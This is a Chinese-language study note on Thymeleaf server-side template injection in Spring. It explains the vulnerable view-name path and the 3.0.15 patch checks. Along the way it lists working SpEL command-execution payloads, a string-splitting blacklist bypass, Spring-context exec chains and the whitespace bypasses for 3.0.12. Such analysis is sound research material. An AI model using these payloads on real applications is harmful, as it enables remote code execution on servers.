## Thymeleaf

- `${}` 变量表达式 在spring应用中解析SPEL语法
- `~{...} ` 片段表达式`Thymeleaf 3.x`版本新增的内容

### Spring MVC 视图解析 ViewResolver接口

Spring会根据当前项目引用具体模板(如:`spring-boot-starter-thymeleaf`) 自动注入模板提供的`ViewResolver接口实现类`

> org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration注解条件bean注入:

`@ConditionalOnMissingBean(  name = {"thymeleafReactiveViewResolver"} )`

- `Thymeleaf` 对应`ThymeleafViewResolver`
- `FreeMarker` 对应`FreeMarkerViewResolver `
- 默认JSP优先级最低 对应`InternalResourceViewResolver`

这些类不仅实现了 `ViewResolver接口`，还负责各模板特有的渲染逻辑

自定义视图实现`ViewResolver接口` 同时配置注解@Bean @order生效



### Thymeleaf 模板注入漏洞

漏洞点：当 Controller 直接返回用户输入的字符串作为模板名称时，`Thymeleaf`会将这个字符串既当作路径又当作表达式进行解析

```java
@GetMapping("/path")
public String vuln(@RequestParam String input) {
    // 如果 input = "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x"
    return "/path/" + input;  // 漏洞 用户控制模板路径
}
```

#### ThymeleafView#renderFragment 漏洞点

`ThymeleafViewResolver`的`createView`方法:视图名称中包含 `::` 或 `${}`/`*{}`/`#{}` 等表达式语法 则触发表达式解析执行

`org.thymeleaf.spring5.view.ThymeleafView#renderFragment`符合`~{viewTemplateName::xxxx}`格式的片段表达式

首先renderFragment 会检查请求中是否指定了片段符号 `::`

```java
String viewTemplateName = this.getTemplateName(); // 视图模板名，如 "index"
Set<String> markupSelectors = this.getMarkupSelectors(); // 片段选择器，如 ":: info"

// 如果视图名中包含 "::"，Thymeleaf 会尝试解析它
if (viewTemplateName.contains("::")) {
    // 解析逻辑...
}
```

触发表达式执行:检查字符串中是否含有 `__${...}__ `这种预处理标记 如存在解析器会立即调用` SpEL `引擎执行括号内的内容，并用结果替换掉这部分字符串

#### 一般利用

基础命令执行
`${T(java.lang.Runtime).getRuntime().exec('id')}`

带输出回显
`${T(org.apache.commons.io.IOUtils).toString(`
    `T(java.lang.Runtime).getRuntime().exec('id').getInputStream()`
`)}`

绕过黑名单（字符串拼接）
`${T(java.lang.Run"+"time).getRuntime().exec('id')}`

JavaScriptEngine JS引擎加载字节码 
`${T(javax.script.ScriptEngineManager).getEngineByName('js').eval('calc')}`

### 获取spring上下文

`${springMacroRequestContext.webApplicationContext}`

`${springRequestContext.webApplicationContext}`

`${#ctx['org.springframework.web.servlet.DispatcherServlet.CONTEXT']}`

`[[${springMacroRequestContext.webApplicationContext.beanFactory.createBean(springMacroRequestContext.webApplicationContext.classLoader.loadClass('org.springframework.expression.spel.standard.SpelExpressionParser')).parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')").getValue()}]]`


### 修复 绕过 版本3.0.15

是 Thymeleaf 官方针对 SSTI漏洞的防御 常用的手段是通过GET参数传入 Payload:

`https://example.com/path?lang=__${T(java.lang.Runtime).getRuntime().exec('calc')}__::.x`

#### org.thymeleaf.util.StringUtils#pack

方法内逻辑:移除字符串中所有的空白字符 并将结果转换为全小写

排除绕过可能的:`%20` `%0a` `%09`

关键逻辑`!Character.isWhitespace(c) && c > ' '` 

- 要求不是空白符isWhitespace返回false
- 字符大于ascii码32

#### org.thymeleaf.spring5.util.SpringRequestUtils#containsExpression

方法检测传入的viewName是否存在SPEL表达式内容, 且形参text经过`StringUtils#pack`处理

3.0.12版本有绕过 通过`%20` `%0a` `%09` 或者不使用new关键字绕过

3.0.15版本经过`StringUtils#pack`方法处理无法绕过:

```java
//3.0.15代码
private static boolean containsExpression(String text) {
    int textLen = text.length();
    boolean expInit = false;

    for(int i = 0; i < textLen; ++i) {
        char c = text.charAt(i);
        if (!expInit) {
            //循环中寻找这5个特殊符号：$ * # @ ~
            if (c == '$' || c == '*' || c == '#' || c == '@' || c == '~') {
                expInit = true;
            }
        } else {
            //一旦expInit==true next char=={，则判定为包含表达式
            //目的匹配 ${...} *{...} #{...}类似结构
            if (c == '{') {
                return true;
            }
            //不是{ 也不是空格 expInit=false 继续寻找$ 
            //阻止空格绕过
            if (!Character.isWhitespace(c)) {
                expInit = false;
            }
        }
    }

    return false;
}
```

#### org.thymeleaf.spring5.util.SpringRequestUtils.checkViewNameNotInRequest

3.0.15版本 

```java
//3.0.15
String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));
    if (requestURI != null && containsExpression(requestURI)) {
        found = true;
    }
```
检测当前准备解析的viewName，是否出现在了GET请求的参数中

#### SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam

禁止3种:
- 对象实例化(`new`) 
- 静态类/方法访问(`T(someClass)`)
- 内置参数访问(`param`)

```java
 public static boolean containsSpELInstantiationOrStaticOrParam(String expression) {
        int explen = expression.length();
        int n = explen;
        int ni = 0;
        int pi = 0;

        while(n-- != 0) {
            char c = expression.charAt(n);
            if (ni >= NEW_LEN || c != NEW_ARRAY[ni] || ni <= 0 && (n + 1 >= explen || !Character.isWhitespace(expression.charAt(n + 1)))) {
                if (ni > 0) {
                    n += ni;
                    ni = 0;
                } else {
                    ni = 0;
                    if (pi >= PARAM_LEN || c != PARAM_ARRAY[pi] || pi <= 0 && (n + 1 >= explen || isSafeIdentifierChar(expression.charAt(n + 1)))) {
                        if (pi > 0) {
                            n += pi;
                            pi = 0;
                        } else {
                            pi = 0;
                            if (c == '(' && n - 1 >= 0 && isPreviousStaticMarker(expression, n)) {
                                return true;
                            }
                        }
                    } else {
                        ++pi;
                        if (pi == PARAM_LEN && (n == 0 || !isSafeIdentifierChar(expression.charAt(n - 1)))) {
                            return true;
                        }
                    }
                }
            } else {
                ++ni;
                if (ni == NEW_LEN && (n == 0 || !isSafeIdentifierChar(expression.charAt(n - 1)))) {
                    return true;
                }
            }
        }

        return false;
    }
```